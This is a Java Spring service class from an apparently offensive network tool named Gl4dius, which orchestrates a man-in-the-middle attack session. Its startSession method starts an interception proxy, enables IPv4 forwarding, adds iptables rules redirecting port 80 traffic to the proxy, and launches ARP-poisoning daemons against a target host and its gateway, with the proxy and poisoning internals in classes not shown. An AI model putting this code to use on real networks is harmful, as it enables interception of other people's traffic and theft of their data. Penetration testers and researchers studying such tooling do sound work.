package io.gl4dius.cli.service.session;

import io.gl4dius.cli.Gl4diusApplication;
import io.gl4dius.cli.assets.PreferencesKey;
import io.gl4dius.cli.exception.GatewayDetectionException;
import io.gl4dius.cli.model.dto.iptables.IptablesRedirectRule;
import io.gl4dius.cli.model.entity.Session;
import io.gl4dius.cli.module.arp.ArpPoisoner;
import io.gl4dius.cli.module.firewall.IptablesRuleManager;
import io.gl4dius.cli.module.ipforwarding.Ipv4ForwardingManager;
import io.gl4dius.cli.repository.PreferencesRepository;
import io.gl4dius.cli.repository.SessionRepository;
import io.gl4dius.cli.service.DaemonModuleExecutor;
import io.gl4dius.cli.service.NetDiscoveryService;
import io.gl4dius.cli.service.proxy.ProxyServerEngine;
import io.gl4dius.cli.utility.NetInterfaceUtil;
import io.gl4dius.cli.utility.UuidUtil;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.jspecify.annotations.NonNull;
import org.pcap4j.core.PcapNativeException;
import org.springframework.stereotype.Service;

@Slf4j
@Service
@RequiredArgsConstructor
public class SessionExecutionService {

    private final DaemonModuleExecutor daemonModuleExecutor;
    private final SessionRepository sessionRepository;
    private final Ipv4ForwardingManager ipv4ForwardingManager;
    private final IptablesRuleManager iptablesRuleManager;
    private final ArpPoisoner arpPoisoner;
    private final PreferencesRepository preferencesRepository;
    private final ProxyServerEngine proxyServerEngine;
    private final NetDiscoveryService netDiscoveryService;

    public void switchSession(String identifier) {
        var session = UuidUtil.parseUuidIfValid(identifier)
                .flatMap(this.sessionRepository::findById)
                .or(() -> this.sessionRepository.findByName(identifier))
                .orElseThrow(() -> new IllegalArgumentException("Session %s not found".formatted(identifier)));

        exitSession();
        Gl4diusApplication.setCurrentSession(session);
        log.debug("Switched to session {}", session.getId());
    }

    public void exitSession() {
        Gl4diusApplication.getCurrentSession().ifPresent(session -> {
            log.debug("Exiting session {}", session.getId());
            stopSession();
        });
        Gl4diusApplication.setCurrentSession(null);
    }

    public void startSession(String nicName, String gatewayIp, String targetIp, String targetMac) throws PcapNativeException {
        //Start attacking infrastructure to capture traffic:
        //    - Starting Proxy server
        //    - Enabling IP forwarding
        //    - Set Iptables rules
        //    - Starting ARP Poisoning

        var proxyPort = this.preferencesRepository.findById(PreferencesKey.PROXY_SERVER_PORT)
                .orElseThrow(() -> new IllegalArgumentException("Proxy server port has not been set"))
                .getValue();
        var nic = NetInterfaceUtil.findInterface(nicName);
        var interfaceIP = NetInterfaceUtil.resolveIp4(nic);
        this.proxyServerEngine.start(interfaceIP.getHostAddress(), Integer.parseInt(proxyPort));

        this.ipv4ForwardingManager.enableIpv4Forwarding();
        this.iptablesRuleManager.addPostRoutingRule(nicName);
        this.iptablesRuleManager.addForwardRule(nicName, nicName);

        this.iptablesRuleManager.addRedirectRule(IptablesRedirectRule.builder()
                .inputInterface(nicName)
                .originalPort(80)
                .destinationIp(interfaceIP.getHostAddress())
                .destinationPort(Integer.parseInt(proxyPort))
                .build());

        if (gatewayIp == null || gatewayIp.isBlank()) {
            gatewayIp = this.netDiscoveryService.findDefaultGateway(nicName)
                    .orElseThrow(() -> new GatewayDetectionException("Automatic NetDiscovery couldn't find NIC gateway IP as default spoofIp parameter, you need to insert it manually"));
        }
        String finalGatewayIp = gatewayIp;
        this.daemonModuleExecutor.execute("victim-arp-poisoner",
                () -> this.arpPoisoner.poison(nicName, finalGatewayIp, targetIp, targetMac));
        this.daemonModuleExecutor.execute("gateway-arp-poisoner",
                () -> this.arpPoisoner.poison(nicName, targetIp, finalGatewayIp, null));

        log.debug("[!] Target Locked and Loaded...");
    }

    public void stopSession() {
        var session = Gl4diusApplication.getCurrentSession()
                .orElseThrow(() -> new IllegalStateException("Current session not set"));
        stopSession(session);
    }

    public void stopSession(@NonNull Session session) {
        log.debug("Stopping session {}", session.getId());
        this.daemonModuleExecutor.stop(session.getId());
    }
}
